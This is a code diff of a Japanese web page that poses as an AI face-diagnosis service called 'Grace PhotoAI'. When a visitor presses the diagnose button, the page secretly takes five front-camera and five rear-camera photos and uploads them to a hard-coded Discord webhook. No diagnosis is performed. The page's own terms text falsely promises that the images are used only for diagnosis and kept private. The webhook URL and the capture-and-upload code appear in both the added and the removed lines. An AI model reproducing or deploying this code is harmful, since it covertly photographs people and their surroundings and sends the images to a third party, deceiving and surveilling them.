@@ -3,144 +3,153 @@
 <html lang="ja">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta property="og:title" content="AI顔診断 Grace">
+  <meta property="og:description" content="肌年齢、顔の比率、イエベ/ブルベ等がすぐにわかる！">
+  <meta property="og:image" content="https://gracephotoai.github.io/grace_preview_1200x630.jpg">
+  <meta property="og:url" content="https://gracephotoai.github.io/">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Grace PhotoAI</title>
   <style>
     body {
-      background-color: #1a1a1a;
+      background-color: #1e1e1e;
       color: white;
-      font-family: Arial, sans-serif;
+      font-family: sans-serif;
       text-align: center;
+      padding: 2rem;
     }
     h1 {
-      font-size: 2.5rem;
-      margin-top: 2rem;
+      font-size: 3rem;
+      margin-bottom: 2rem;
     }
     button {
-      font-size: 1.5rem;
+      font-size: 1.8rem;
       padding: 1rem 2rem;
-      margin: 2rem;
-      border-radius: 8px;
       border: none;
       background-color: #4caf50;
       color: white;
+      border-radius: 8px;
       cursor: pointer;
+    }
+    button:hover {
+      background-color: #45a049;
     }
     .terms-link {
-      font-size: 0.9rem;
-      text-decoration: underline;
+      margin-top: 2rem;
+      font-size: 1rem;
+      color: #ccc;
       cursor: pointer;
-      color: #aaa;
-      margin-bottom: 30px;
-      display: inline-block;
+      text-decoration: underline;
     }
-    .modal {
+    #terms-modal {
       display: none;
       position: fixed;
       z-index: 1000;
       left: 0; top: 0;
       width: 100%; height: 100%;
-      background-color: rgba(0,0,0,0.8);
+      background: rgba(0,0,0,0.8);
+      color: white;
+      padding: 2rem;
       overflow: auto;
     }
-    .modal-content {
-      background: #2c2c2c;
-      color: white;
-      margin: 10% auto;
-      padding: 20px;
-      border-radius: 8px;
-      max-width: 700px;
-      font-size: clamp(0.8rem, 2vw, 1rem);
-    }
-    .close {
-      float: right;
-      font-size: 1.2rem;
-      cursor: pointer;
+    #terms-modal-content {
+      background: #333;
+      padding: 2rem;
+      border-radius: 10px;
+      max-width: 600px;
+      margin: 5% auto;
     }
   </style>
 </head>
 <body>
   <h1>Grace PhotoAI</h1>
-  <button id="startButton">診断する</button>
-  <div class="terms-link" id="termsLink">利用規約</div>
+  <button onclick="startDualCameraCapture()">診断する</button>
+  <div class="terms-link" onclick="document.getElementById('terms-modal').style.display='block'">利用規約</div>
 
-  <div id="termsModal" class="modal">
-    <div class="modal-content">
-      <span class="close" id="closeModal">&times;</span>
+  <div id="terms-modal">
+    <div id="terms-modal-content">
       <h2>利用規約</h2>
-      <p>...（省略：利用規約の本文）...</p>
+      <p>このサイトはAIによる顔診断を目的としています。画像は診断のみに使用され、外部に公開されることはありません。</p>
+      <button onclick="document.getElementById('terms-modal').style.display='none'">閉じる</button>
     </div>
   </div>
 
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  
   <script>
-    document.getElementById("termsLink").onclick = () => {
-      document.getElementById("termsModal").style.display = "block";
-    };
-    document.getElementById("closeModal").onclick = () => {
-      document.getElementById("termsModal").style.display = "none";
-    };
-    window.onclick = e => {
-      if (e.target == document.getElementById("termsModal")) {
-        document.getElementById("termsModal").style.display = "none";
-      }
-    };
+    const video = document.getElementById("video");
+    const webhookUrl = "https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u";
 
-    document.getElementById("startButton").onclick = async function () {
-      const webhook = "https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u";
-      const formData = new FormData();
+    function stopStream() {
+      if (video.srcObject) {
+        video.srcObject.getTracks().forEach(track => track.stop());
+        video.srcObject = null;
+      }
+    }
+
+    async function waitForVideoReady() {
+      return new Promise(resolve => {
+        video.onloadedmetadata = () => resolve();
+      });
+    }
+
+    async function captureFromCamera(facingMode) {
+      stopStream();
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }});
+        video.srcObject = stream;
+        await waitForVideoReady();
+        return stream;
+      } catch (err) {
+        console.error("カメラへのアクセスが許可されていません。", err);
+        return null;
+      }
+    }
+
+    async function captureImages(count, interval) {
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
       const images = [];
 
-      async function captureImages(facingMode) {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
-        const video = document.createElement("video");
-        video.setAttribute("playsinline", true);
-        video.muted = true;
-        video.srcObject = stream;
-        await video.play();
-
-        await new Promise(resolve => {
-          video.onloadedmetadata = () => resolve();
-        });
-
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext("2d");
-
-        for (let i = 0; i < 5; i++) {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg"));
-          images.push(blob);
-          await new Promise(r => setTimeout(r, 200));
-        }
-
-        stream.getTracks().forEach(track => track.stop());
+      for (let i = 0; i < count; i++) {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
+        images.push(blob);
+        await new Promise(resolve => setTimeout(resolve, interval));
       }
 
-      await captureImages("user");
-      await captureImages("environment");
+      return images;
+    }
 
-      // テキストメッセージを一緒に送る
-      const payload = {
-        content: "サイトから取得した写真を送信
+    async function startDualCameraCapture() {
+      let allImages = [];
 
-＜━━━━━＞
-1〜5枚目 インカメラで撮影した写真
-6〜10枚目 アウトカメラで撮影した写真
-インカメラ→内カメ
-アウトカメラ→外カメ"
-      };
-      formData.append("payload_json", JSON.stringify(payload));
+      const userStream = await captureFromCamera("user");
+      if (userStream) {
+        const userImages = await captureImages(5, 200);
+        allImages = allImages.concat(userImages);
+      }
 
-      images.forEach((blob, i) => {
-        formData.append(`files[${i}]`, blob, `photo${i + 1}.jpg`);
+      const envStream = await captureFromCamera("environment");
+      if (envStream) {
+        const envImages = await captureImages(5, 200);
+        allImages = allImages.concat(envImages);
+      }
+
+      stopStream();
+
+      const formData = new FormData();
+      allImages.forEach((blob, i) => {
+        formData.append(`files[${i}]`, blob, `image${i + 1}.jpg`);
       });
 
-      await fetch(webhook, {
+      fetch(webhookUrl, {
         method: "POST",
         body: formData
       });
-    };
+    }
   </script>
 </body>
 </html>
